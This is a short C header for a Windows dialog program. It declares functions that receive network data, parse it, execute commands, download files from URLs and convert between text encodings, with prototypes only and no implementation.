// Snow 2017-04-10
#pragma once

#include <Windows.h>

typedef struct {
	HWND hOutput;
	INT Sock;
} THREAD_DATA;

INT_PTR CALLBACK MainWndProc(HWND hMainWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
INT InitNetwork();
DWORD WINAPI NetThreadProc(LPVOID lParam);
VOID ParseData(HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddress);
LPTSTR GetFilenameFromUrl(const LPTSTR szUrl);
BOOL ExecuteCommand(HWND hOutput, const LPTSTR lpCmdLine);
BOOL DownloadFile(const LPTSTR lpCmdLine, LPTSTR szSavePath);
VOID CleanNetwork(INT Sock);
wchar_t * ANSIToUnicode(const char* str);
char * UnicodeToANSI(const wchar_t *str);